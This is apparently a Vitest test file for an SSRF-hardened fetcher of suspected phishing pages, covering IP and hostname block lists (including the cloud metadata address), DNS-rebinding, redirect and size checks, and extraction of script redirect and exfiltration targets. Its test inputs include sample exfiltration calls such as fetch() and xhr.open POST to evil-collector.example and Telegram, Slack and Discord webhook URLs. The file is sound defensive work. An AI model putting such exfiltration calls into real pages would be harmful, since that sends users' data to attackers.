import { describe, it, expect, vi } from "vitest";
import {
  pageFetchHostStaticBlockReason,
  resolvedIpBlockReason,
} from "../src/lib/url-guard";
import {
  fetchSuspectPage,
  assertResolvedHostSafe,
  followToFinalResponse,
  enforceResponseLimits,
  extractJsRedirectTargets,
  extractScriptSinkTargets,
  type FetchDeps,
} from "../src/lib/page-fetch";

// ─── Test helpers ─────────────────────────────────────────────────

function htmlResponse(body: string, init: { status?: number; contentLength?: number } = {}): Response {
  const headers: Record<string, string> = { "content-type": "text/html; charset=utf-8" };
  if (init.contentLength !== undefined) headers["content-length"] = String(init.contentLength);
  return new Response(body, { status: init.status ?? 200, headers });
}

function redirectResponse(location: string, status = 302): Response {
  return new Response(null, { status, headers: { location } });
}

/** Deps whose resolver maps host→IPs and fetcher maps URL→Response. */
function makeDeps(opts: {
  resolve?: (host: string) => string[];
  fetch?: (url: string) => Response;
}): { deps: FetchDeps; fetchSpy: ReturnType<typeof vi.fn>; resolveSpy: ReturnType<typeof vi.fn> } {
  const resolveSpy = vi.fn(async (host: string) => (opts.resolve ? opts.resolve(host) : ["93.184.216.34"]));
  const fetchSpy = vi.fn(async (url: string) => {
    if (opts.fetch) return opts.fetch(url);
    return htmlResponse("<html></html>");
  });
  return { deps: { resolve: resolveSpy, fetchImpl: fetchSpy }, fetchSpy, resolveSpy };
}

// ─── url-guard block helpers (reused, not re-implemented) ─────────

describe("url-guard page-fetch block helpers", () => {
  it("resolvedIpBlockReason blocks the cloud metadata address", () => {
    expect(resolvedIpBlockReason("169.254.169.254")).not.toBeNull();
  });
  it("resolvedIpBlockReason blocks private + loopback + CGNAT ranges", () => {
    expect(resolvedIpBlockReason("10.0.0.5")).not.toBeNull();
    expect(resolvedIpBlockReason("127.0.0.1")).not.toBeNull();
    expect(resolvedIpBlockReason("192.168.1.1")).not.toBeNull();
    expect(resolvedIpBlockReason("172.16.0.1")).not.toBeNull();
    expect(resolvedIpBlockReason("100.64.0.1")).not.toBeNull();
    expect(resolvedIpBlockReason("::1")).not.toBeNull();
    expect(resolvedIpBlockReason("fd00::1")).not.toBeNull();
    expect(resolvedIpBlockReason("::ffff:10.0.0.1")).not.toBeNull();
  });
  it("resolvedIpBlockReason blocks the additive non-routable IPv4 ranges", () => {
    expect(resolvedIpBlockReason("192.0.0.1")).not.toBeNull();     // 192.0.0.0/24 IETF
    expect(resolvedIpBlockReason("198.18.0.1")).not.toBeNull();    // 198.18.0.0/15 benchmarking
    expect(resolvedIpBlockReason("198.19.255.1")).not.toBeNull();  // 198.18.0.0/15 upper half
    expect(resolvedIpBlockReason("224.0.0.1")).not.toBeNull();     // 224.0.0.0/4 multicast
    expect(resolvedIpBlockReason("239.255.255.250")).not.toBeNull(); // multicast (SSDP)
    expect(resolvedIpBlockReason("240.0.0.1")).not.toBeNull();     // 240.0.0.0/4 reserved
    expect(resolvedIpBlockReason("255.255.255.255")).not.toBeNull(); // broadcast
  });
  it("resolvedIpBlockReason blocks the NAT64 well-known prefix (dotted + hex tail)", () => {
    expect(resolvedIpBlockReason("64:ff9b::10.0.0.1")).not.toBeNull();     // embedded private, dotted
    expect(resolvedIpBlockReason("64:ff9b::c0a8:1")).not.toBeNull();       // embedded 192.168.0.1, hex
    expect(resolvedIpBlockReason("64:ff9b::169.254.169.254")).not.toBeNull(); // embedded metadata
    expect(resolvedIpBlockReason("64:ff9b::")).not.toBeNull();             // undecodable → blocked
  });
  it("resolvedIpBlockReason still allows normal public IPv4 (no over-block)", () => {
    expect(resolvedIpBlockReason("93.184.216.34")).toBeNull();
    expect(resolvedIpBlockReason("198.20.0.1")).toBeNull();  // just outside 198.18/15
    expect(resolvedIpBlockReason("223.255.255.255")).toBeNull(); // just below 224/4
    expect(resolvedIpBlockReason("192.0.1.1")).toBeNull();   // just outside 192.0.0/24
  });
  it("pageFetchHostStaticBlockReason rejects IP-literal + localhost + internal suffixes", () => {
    expect(pageFetchHostStaticBlockReason("127.0.0.1")).not.toBeNull();
    expect(pageFetchHostStaticBlockReason("169.254.169.254")).not.toBeNull();
    expect(pageFetchHostStaticBlockReason("localhost")).not.toBeNull();
    expect(pageFetchHostStaticBlockReason("foo.local")).not.toBeNull();
    expect(pageFetchHostStaticBlockReason("svc.internal")).not.toBeNull();
    expect(pageFetchHostStaticBlockReason("x.workers.dev")).not.toBeNull();
    expect(pageFetchHostStaticBlockReason("averrow.com")).not.toBeNull();
  });
  it("pageFetchHostStaticBlockReason allows a normal public hostname", () => {
    expect(pageFetchHostStaticBlockReason("acme-secure-login.com")).toBeNull();
  });
});

// ─── Resolve-then-validate (DNS rebinding) ────────────────────────

describe("assertResolvedHostSafe — DNS-rebinding defense", () => {
  it("blocks a public hostname that resolves to the metadata IP", async () => {
    const { deps } = makeDeps({ resolve: () => ["169.254.169.254"] });
    const r = await assertResolvedHostSafe("evil.example", deps, new Map());
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.blocked).toBe(true);
  });

  it("blocks when ANY of several resolved IPs is private", async () => {
    const { deps } = makeDeps({ resolve: () => ["93.184.216.34", "10.0.0.9"] });
    const r = await assertResolvedHostSafe("evil.example", deps, new Map());
    expect(r.ok).toBe(false);
  });

  it("fails closed on an unresolvable host (never fetched)", async () => {
    const { deps } = makeDeps({ resolve: () => [] });
    const r = await assertResolvedHostSafe("nx.example", deps, new Map());
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.blocked).toBe(false); // transient, not a hard block
  });

  it("allows a host resolving only to public IPs", async () => {
    const { deps } = makeDeps({ resolve: () => ["93.184.216.34"] });
    const r = await assertResolvedHostSafe("acme-secure.com", deps, new Map());
    expect(r.ok).toBe(true);
  });
});

// ─── Redirect handling ────────────────────────────────────────────

describe("followToFinalResponse — redirects", () => {
  it("rejects a disallowed-scheme start URL", async () => {
    const { deps } = makeDeps({});
    const r = await followToFinalResponse(new URL("ftp://x/"), deps, Date.now() + 5000, new Map());
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.blocked).toBe(true);
      expect(r.reason).toContain("disallowed_scheme");
    }
  });

  it("rejects when redirects exceed the hop limit", async () => {
    const { deps } = makeDeps({ fetch: () => redirectResponse("https://acme-secure.com/next") });
    const r = await followToFinalResponse(
      new URL("https://acme-secure.com/"), deps, Date.now() + 5000, new Map(),
    );
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe("too_many_redirects");
  });

  it("blocks a redirect that points at a private-resolving host", async () => {
    const resolve = (host: string) => (host === "acme-secure.com" ? ["93.184.216.34"] : ["10.0.0.5"]);
    const { deps } = makeDeps({
      resolve,
      fetch: (url) => (url.includes("acme-secure.com") ? redirectResponse("https://internal.evil/") : htmlResponse("<html></html>")),
    });
    const r = await followToFinalResponse(
      new URL("https://acme-secure.com/"), deps, Date.now() + 5000, new Map(),
    );
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.blocked).toBe(true);
  });

  it("returns the final non-redirect response after one hop", async () => {
    let call = 0;
    const { deps } = makeDeps({
      fetch: () => (call++ === 0 ? redirectResponse("https://acme-secure.com/final") : htmlResponse("<html>ok</html>")),
    });
    const r = await followToFinalResponse(
      new URL("https://acme-secure.com/"), deps, Date.now() + 5000, new Map(),
    );
    expect(r.ok).toBe(true);
  });
});

// ─── Size cap + content-type gate ─────────────────────────────────

describe("enforceResponseLimits — size + content-type", () => {
  it("rejects a non-html content-type", async () => {
    const res = new Response("plain", { headers: { "content-type": "text/plain" } });
    const r = await enforceResponseLimits(res, 1000);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe("non_html_content_type");
  });

  it("rejects a declared-oversize response without streaming it", async () => {
    const res = htmlResponse("<html></html>", { contentLength: 10_000_000 });
    const r = await enforceResponseLimits(res, 512 * 1024);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe("oversize_declared");
  });

  it("rejects a streamed body that exceeds the cap", async () => {
    const res = htmlResponse("x".repeat(50));
    const r = await enforceResponseLimits(res, 10);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe("oversize");
  });

  it("accepts an html body under the cap", async () => {
    const res = htmlResponse("<html><body>hi</body></html>");
    const r = await enforceResponseLimits(res, 512 * 1024);
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.bytes.length).toBeGreaterThan(0);
  });
});

// ─── fetchSuspectPage orchestration (rejection paths) ─────────────

describe("fetchSuspectPage — SSRF rejections", () => {
  it("blocks an IP-literal host at the static gate before any I/O", async () => {
    const { deps, fetchSpy, resolveSpy } = makeDeps({});
    const r = await fetchSuspectPage("127.0.0.1", { deps });
    expect(r.ok).toBe(false);
    expect(r.blocked).toBe(true);
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(resolveSpy).not.toHaveBeenCalled();
  });

  it("blocks a DNS-rebinding host (public name → metadata IP) without fetching the page", async () => {
    const { deps, fetchSpy } = makeDeps({ resolve: () => ["169.254.169.254"] });
    const r = await fetchSuspectPage("phish.example", { deps });
    expect(r.ok).toBe(false);
    expect(r.blocked).toBe(true);
    // The page itself is never fetched.
    for (const call of fetchSpy.mock.calls) {
      expect(String(call[0])).not.toContain("phish.example");
    }
  });

  it("blocks a redirect to a disallowed scheme", async () => {
    const { deps } = makeDeps({ fetch: () => redirectResponse("ftp://evil/") });
    const r = await fetchSuspectPage("acme-secure.com", { deps });
    expect(r.ok).toBe(false);
    expect(r.blocked).toBe(true);
  });

  it("rejects (not blocked) a non-html page", async () => {
    const { deps } = makeDeps({
      fetch: () => new Response("nope", { status: 200, headers: { "content-type": "application/json" } }),
    });
    const r = await fetchSuspectPage("acme-secure.com", { deps });
    expect(r.ok).toBe(false);
    expect(r.rejectedReason).toBe("non_html_content_type");
    expect(r.httpStatus).toBe(200);
  });

  it("rejects an oversize declared page", async () => {
    const { deps } = makeDeps({ fetch: () => htmlResponse("<html></html>", { contentLength: 5_000_000 }) });
    const r = await fetchSuspectPage("acme-secure.com", { deps });
    expect(r.ok).toBe(false);
    expect(r.rejectedReason).toBe("oversize_declared");
  });
});

// ─── JS redirect extraction (no catastrophic backtracking) ────────

describe("extractJsRedirectTargets", () => {
  it("pulls a location.href assignment target", () => {
    expect(extractJsRedirectTargets(`window.location.href = "https://acme.com/verify";`))
      .toContain("https://acme.com/verify");
  });
  it("pulls a location.replace() target", () => {
    expect(extractJsRedirectTargets(`location.replace('https://acme.com/x')`))
      .toContain("https://acme.com/x");
  });
  it("returns empty for script with no redirect", () => {
    expect(extractJsRedirectTargets(`console.log("hello world")`)).toEqual([]);
  });
});

// ─── Exfil sink target extraction (Lane 3 §3.1 B1, page-fetch.ts:407-439) ──
// Structurally identical extraction to extractJsRedirectTargets above —
// same marker-then-next-quoted-segment walk, same no-catastrophic-
// backtracking contract — over request-shaped markers instead of
// redirect-shaped ones. This is the leg that closes the live false
// negative in offdomain_form_exfil, which reads <form action> ONLY.

describe("extractScriptSinkTargets", () => {
  it("fetch(): pulls a double-quoted target", () => {
    expect(
      extractScriptSinkTargets(`fetch("https://api.telegram.org/bot123456:ABC-token/sendMessage")`),
    ).toContain("https://api.telegram.org/bot123456:ABC-token/sendMessage");
  });

  it("fetch(): pulls a single-quoted target", () => {
    expect(extractScriptSinkTargets(`fetch('https://evil-collector.example/x')`))
      .toContain("https://evil-collector.example/x");
  });

  it("fetch(): pulls a backtick-quoted target", () => {
    expect(extractScriptSinkTargets("fetch(`https://evil-collector.example/y`)"))
      .toContain("https://evil-collector.example/y");
  });

  it("navigator.sendBeacon(): pulls the target (case-insensitive marker match)", () => {
    expect(
      extractScriptSinkTargets(`navigator.sendBeacon("https://hooks.slack.com/services/T000/B000/XXXX")`),
    ).toContain("https://hooks.slack.com/services/T000/B000/XXXX");
  });

  it("axios.post(): pulls the target", () => {
    expect(extractScriptSinkTargets(`axios.post('https://discord.com/api/webhooks/999/abc')`))
      .toContain("https://discord.com/api/webhooks/999/abc");
  });

  it("XMLHttpRequest: pulls the first quoted string found within the marker's window", () => {
    expect(
      extractScriptSinkTargets(`var req = XMLHttpRequest("https://api.telegram.org/bot777:ZZ/x")`),
    ).toContain("https://api.telegram.org/bot777:ZZ/x");
  });

  it("known dud, documented: .open()'s FIRST quoted segment is the HTTP method, not the URL", () => {
    // The marker itself is intentionally kept (page-fetch.ts:399-405) even
    // though the common xhr.open('METHOD', url) call shape means this leg
    // mostly yields the verb, not the target. fetch()/sendBeacon()/
    // axios.post() carry the recall for the URL itself.
    const targets = extractScriptSinkTargets(`xhr.open('POST', 'https://evil-collector.example/exfil');`);
    expect(targets).toContain("POST");
    expect(targets).not.toContain("https://evil-collector.example/exfil");
  });

  it("no match within the 300-char window after the marker yields nothing for that occurrence", () => {
    const filler = "x".repeat(310);
    const script = `fetch(${filler}"https://evil-collector.example/too-far")`;
    expect(extractScriptSinkTargets(script)).toEqual([]);
  });

  it("bounded at 32 total targets even with far more matching occurrences", () => {
    const script = Array.from(
      { length: 40 },
      (_, i) => `fetch("https://evil-collector.example/${i}")`,
    ).join(";\n");
    expect(extractScriptSinkTargets(script)).toHaveLength(32);
  });

  it("returns empty for script with none of the request-shaped markers", () => {
    expect(extractScriptSinkTargets(`console.log("hello world")`)).toEqual([]);
  });
});
